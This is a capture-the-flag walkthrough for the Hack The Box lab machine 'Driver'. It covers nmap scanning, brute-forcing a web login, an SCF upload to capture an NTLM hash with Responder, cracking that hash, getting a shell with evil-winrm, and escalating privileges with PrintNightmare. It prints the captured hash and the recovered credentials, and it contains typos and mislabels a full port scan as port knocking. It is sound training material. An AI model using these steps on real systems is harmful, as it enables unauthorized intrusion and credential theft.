# Driver

**IP-Address** : 10.10.11.106

**Difficulty-Rating** : Easy

## Reconnaisance

We use nmap to find out the open ports and the services running on it.

`nmap -sC -sV 10.10.11.106`

* We find that there are 3 ports open, 80/tcp , 135/tcp and 445/tcp.
* Service on port 80 is http. version Microsoft IIS httpd 10.0
* Service on port 135 is msrpc.
* Service on port 445 is microsoft-ds

After the initial scanning with nmap, I chose to do a port knocking scan to find further information.

### Port Knocking Scan

Port knocking is a method of establishing a connection to a networked computer that has no open ports. Before a connection is established, ports are opened using a port knock sequence, which is a series of connection attempts to closed ports. A remote host generates and sends an authentic knock sequence in order to manipulate the server's firewall rules to open one or more specific ports. These manipulations are mediated by a port knock daemon, running on the server, which monitors the firewall log file for connection attempts that can be translated into authentic knock sequences. Once the desired ports are opened, the remote host can establish a connection and begin a session. Another knock sequence may be used to trigger the closing of the port.

`sudo nmap -sSV -T4 -O -p0-65535 10.10.11.106`

* The only open port on port knock scan is port 5985/tcp.
* Quick google search on port 5985 will give you an important detail that the service runing is **winrm**
* I used searchsploit and metasploit to find any exploit on winrm and found a few but evry one of the required a username and password.


Since there is an http server running, I test that out but was immediately greeted with a login popup. I had to bruteforce it and found that `admin:admin` is the username and passsword.

The *Firmware update* page has an upload form which we could potentially use to upload malicious firmware.

A quick google search, "windows print firmware exploit" gave very important insight into what kind of exploits that can be used. **PrintNightmare** exploit stands out as a potential candidate.

A lot of searching in google lead me to believe that I could obtain the password hash of the target through an NTLM capture exploit on SMB since the file we upload might probably is being saved in the smb share of windows.

## Exploit

We create the file to be uploaded, *shell.scf*. We then start the responder on our terminal and listen for events.

`sudo respondeer -wrf --lm -v -I <my-ip>`

We captured the hash,

`tony::DRIVER:39d2f11d3ab1b40c:E83DDDBFB95336C895649059B0B7D943:0101000000000000FD437ABCF8F5D7014BB2A8D96639B9AE00000000020000000000000000000000 `

Now I used john on kali with rockyou.txt wordlist to crack the hash and got the password as 'liltony' and username as 'tony'.

Since we got the username and password, we just need to connect to the winrm service and obtain a shell. I found that *Evil-WinRM* is very efficient in doing so.

https://github.com/Hackplayers/evil-winrm

or use `gem intsall evil-winrm` to install the package.

use, `evil-winrm -i 10.10.11.106 -u tony -p liltony` to connect and obtain the shell. **The user flag is obtained from the Desktop.**

## Privilege Escalation

It is here for the local privilege escalation that the PrintNightmare exploit that we saw before comes to use. 

You can get the powershell code for the exploit in this github library,

https://github.com/calebstewart/CVE-2021-1675

Download it on the target machine and run,

`Invoke-Nightmare -NewUser "newUser" -NewPassword "SuperSecure`

Now use evil-winrm with the new username and password with escalated privilege to connect and obtain a new shell.

The root flag can be obtained from `cd C:\Users\Administrator\Desktop`







